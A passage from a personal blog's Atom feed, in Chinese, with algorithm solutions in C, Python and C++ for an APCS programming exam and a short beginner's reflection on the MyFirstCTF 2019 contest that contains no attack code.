class="line">            weight[i][j] = w;</span><br><span class="line">            visit[i][j] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, min_pos[<span class="number">0</span>], min_pos[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>, ans = <span class="number">0</span>, pre_r, pre_c, r, c;</span><br><span class="line">    r = min_pos[<span class="number">0</span>];</span><br><span class="line">    c = min_pos[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">        ans += weight[r][c];</span><br><span class="line">        visit[r][c] = <span class="number">1</span>;</span><br><span class="line">        pre_r = r;</span><br><span class="line">        pre_c = c;</span><br><span class="line">        <span class="comment">// printf(&quot;R: %d, C: %d, min:%d\n&quot;, r, c, min);</span></span><br><span class="line">        min = INF;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (pre_r &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> (visit[pre_r - <span class="number">1</span>][pre_c] == <span class="number">0</span> &amp;&amp; weight[pre_r - <span class="number">1</span>][pre_c] &lt; min) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                min = weight[pre_r - <span class="number">1</span>][pre_c];</span><br><span class="line">                r = pre_r - <span class="number">1</span>;</span><br><span class="line">                c = pre_c;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pre_c &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> (visit[pre_r][pre_c - <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; weight[pre_r][pre_c - <span class="number">1</span>] &lt; min) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                min = weight[pre_r][pre_c - <span class="number">1</span>];</span><br><span class="line">                r = pre_r;</span><br><span class="line">                c = pre_c - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pre_r &lt; R - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span>(visit[pre_r + <span class="number">1</span>][pre_c] == <span class="number">0</span> &amp;&amp; weight[pre_r + <span class="number">1</span>][pre_c] &lt; min) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                min = weight[pre_r + <span class="number">1</span>][pre_c];</span><br><span class="line">                r = pre_r + <span class="number">1</span>;</span><br><span class="line">                c = pre_c;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pre_c &lt; C - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> (visit[pre_r][pre_c + <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; weight[pre_r][pre_c + <span class="number">1</span>] &lt; min) &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                min = weight[pre_r][pre_c - <span class="number">1</span>];</span><br><span class="line">                r = pre_r;</span><br><span class="line">                c = pre_c + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我自己覺得這個寫的不是很好，但是也想不到更好的辦法 (つд⊂)</p><hr><h2 id="卡通組合"><a href="#卡通組合" class="headerlink" title="卡通組合"></a>卡通組合</h2><p><a href="/images/APCS/20190615/P3.pdf">點我閱讀題目</a></p><p>有M個卡通人物，N個卡通團隊<br>M是一個整數，代表會有幾個字母用來表示人物，<code>len(&#39;ABCD....&#39;) = M</code></p><p>集合由一字串表示字串中字母可以重複也可以顛倒，<code>ACCDDBBB = &#123;A, C, D, B&#125;</code><br>求沒有交集，但是聯集數量為M的集合各數</p><p><strong>策略</strong> 把字串讀進來之後就把它拆成字元丟進Python的set()裡面再用set運算 <del>蝦?你說為什麼用Python? 我就懶癌末期</del></p><figure class="highlight python"><figcaption><span>P3.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">M = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_into_char</span>(<span class="params">string</span>):</span></span><br><span class="line">    ret = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string:</span><br><span class="line">        ret.add(a)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">sets = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    get_ = <span class="built_in">input</span>()</span><br><span class="line">    sets.append(break_into_char(get_))</span><br><span class="line"></span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N - <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, N):</span><br><span class="line">        <span class="keyword">if</span> sets[i] &amp; sets[j] == <span class="built_in">set</span>():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(sets[i] | sets[j]) == M:</span><br><span class="line">                ans += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="完美彩帶"><a href="#完美彩帶" class="headerlink" title="完美彩帶"></a>完美彩帶</h2><p><a href="/images/APCS/20190615/P4.pdf">點我閱讀題目</a> </p><p>感謝朋友提供一個很好的解法(Sliding window)!學到新做法了!!</p><p>長度為N，顏色數量為M</p><p><strong>策略</strong> 使用一個Dequeue，從front取值、從end新增，列隊內只會一次出現M個顏色，這時只要比對列隊內相異顏色數量是不是等於M就好，是的話這段就是<strong>完美彩帶</strong>!!</p><figure class="highlight cpp"><figcaption><span>P4.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; occur;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">deque</span>&lt;<span class="keyword">int</span>&gt; cols;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M, N, in, count = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;M, &amp;N);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;in);</span><br><span class="line">        cols.push_back(in);</span><br><span class="line">        occur[in]++;                    <span class="comment">// 顏色出現次數</span></span><br><span class="line">        <span class="keyword">if</span>(occur[in] == <span class="number">1</span>) count++;     <span class="comment">// 列隊內顏色總數++</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count == M) ans++;              <span class="comment">// 如果列隊內相異顏色數量=M 則發現一條完美彩帶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = M; i &lt; N; i++) &#123;</span><br><span class="line">        occur[cols[<span class="number">0</span>]]--;               <span class="comment">// 取列隊頭，將列隊頭出現次數 - 1</span></span><br><span class="line">        <span class="keyword">if</span> (!occur[cols[<span class="number">0</span>]]) count--;   <span class="comment">// 如果列隊頭的出現次數=0，代表列隊內顏色總數少1</span></span><br><span class="line">        cols.pop_front();               <span class="comment">// 列隊頭彈出列隊</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;in);          <span class="comment">// 讀下個顏色</span></span><br><span class="line">        cols.push_back(in);             <span class="comment">// 下個顏色進列隊</span></span><br><span class="line">        occur[in]++;                    <span class="comment">// 該顏色出現次數+1</span></span><br><span class="line">        <span class="keyword">if</span> (occur[in] == <span class="number">1</span>) count++;    <span class="comment">// 列隊內總色數++</span></span><br><span class="line">        <span class="keyword">if</span> (count == M) ans++;          <span class="comment">// 如果列隊內相異顏色數量=M 則發現一條完美彩帶</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這個解法想像起來還蠻好玩的，就是一個滑動的比對塊w</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;APCS初挑戰(･ω´･ )&lt;br&gt;裸考上陣測試自己的實力所在&lt;del&gt;其實是太高估自己&lt;/del&gt;&lt;br&gt;沒意外的話應該是概念題4級分、實作題3級分~&lt;/p&gt;
&lt;p&gt;以下是題目的Writeup(`・ω・´)，雖然在現場沒有全部寫出來不過還是要有複習的好習慣!&lt;br&gt;可能寫得很糟，如果有更好的建議可以透過社交軟體聯絡我說說你的想法!&lt;/p&gt;</summary>
    
    
    
    <category term="APCS" scheme="https://twinklestar03.com/categories/APCS/"/>
    
    
    <category term="APCS" scheme="https://twinklestar03.com/tags/APCS/"/>
    
    <category term="APCS-20190616" scheme="https://twinklestar03.com/tags/APCS-20190616/"/>
    
  </entry>
  
  <entry>
    <title>MyFirstCTF-2019::參賽心得</title>
    <link href="https://twinklestar03.com/Contest/CTF/MyFirstCTF_2019/"/>
    <id>https://twinklestar03.com/Contest/CTF/MyFirstCTF_2019/</id>
    <published>2019-05-29T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:34.667Z</updated>
    
    <content type="html"><![CDATA[<p>人生第一次參加CTF競賽，聽主辦單位說選擇選手的時候就是選沒有參加過任何比賽的，所以應該都跟我一樣都是新手吧XD，然後主辦單位就說可能有人Bypass了篩選機制混進來了w</p><a id="more"></a><hr><h2 id="進到會場開好電腦設置好環境就在等待開賽，跟名牌拍了個照"><a href="#進到會場開好電腦設置好環境就在等待開賽，跟名牌拍了個照" class="headerlink" title="進到會場開好電腦設置好環境就在等待開賽，跟名牌拍了個照~"></a><strong>進到會場開好電腦設置好環境就在等待開賽，跟名牌拍了個照~</strong></h2><p><img src="/images/MFCTF/MFCTF_nametag.jpg"></p><p>第一次比CTF真的不知道該從哪裡下手Orz，但我還是大概知道會有哪些題目分類(Pwn, Web, Crypto, Reverse, Misc)，我還是硬著頭皮把每一題點開來看看，<del>果真大部分都看不懂!</del> </p><p>最後我選擇把每個項目的第一題解掉就好，但好像結果不是這樣子ww</p><hr><h2 id="解題記分板"><a href="#解題記分板" class="headerlink" title="解題記分板"></a><strong>解題記分板</strong></h2><p><img src="/images/MyFirstCTF_2019/MFCTF_challenges.png"></p><p><img src="/images/MyFirstCTF_2019/MFCTF_challenges_2.png"></p><p>綠色的是被解掉的題目黑色的是沒解掉的，<del>可見真的還太菜了XDD</del></p><ul><li>Pwn 原本以為Welcome BOF可以解掉，但最後結果是我不知道怎麼送出payload@_@</li><li>Crypto的話則是完全不熟悉的領域Orz</li><li>Web的話則是Service Worker把Flag Cache起來，其他題完全不知道怎麼解…</li><li>Reverse很神奇的把答案用IDA<strong>看</strong>出來了</li></ul><hr><h2 id="排行榜"><a href="#排行榜" class="headerlink" title="排行榜"></a><strong>排行榜</strong></h2><p><img src="/images/MyFirstCTF_2019/MFCTF_place.png"></p><hr><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a><strong>總結</strong></h2><p>這次的經驗真的學了很多，被我解掉的題目基本上都是現場才開始查資料學習怎麼操作一些基本工具，短短6個小時收穫真的滿滿，然後發現了Reverse的好玩之處，未來應該會朝著這類型題目前進，希望有一天解題計分板上面可以綠油油的一片w</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;人生第一次參加CTF競賽，聽主辦單位說選擇選手的時候就是選沒有參加過任何比賽的，所以應該都跟我一樣都是新手吧XD，然後主辦單位就說可能有人Bypass了篩選機制混進來了w&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://twinklestar03.com/tags/CTF/"/>
    
    <category term="MyFirstCTF" scheme="https://twinklestar03.com/tags/MyFirstCTF/"/>
    
  </entry>
  
</feed>
